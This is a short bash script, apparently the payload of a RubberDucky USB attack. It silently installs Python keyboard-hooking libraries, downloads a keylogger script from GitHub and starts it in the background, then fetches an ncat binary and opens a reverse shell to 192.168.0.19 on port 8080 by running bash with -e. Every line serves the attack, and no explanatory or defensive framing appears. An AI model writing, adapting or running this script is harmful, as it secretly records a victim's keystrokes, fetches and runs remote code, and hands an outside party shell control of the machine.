#!/bin/bash
# Download files

pip3 install pyxhook -qqq
pip3 install python-xlib -qqq

wget -q https://raw.githubusercontent.com/Anthony-Figi/RubberDucky-Keylogger-Netcat/master/linux/logger.py
nohup python3 logger.py &


wget -q https://github.com/Anthony-Figi/RubberDucky-Keylogger-Netcat/raw/master/linux/ncat
chmod 775 ./ncat
nohup ./ncat 192.168.0.19 8080 -e /usr/bin/bash &





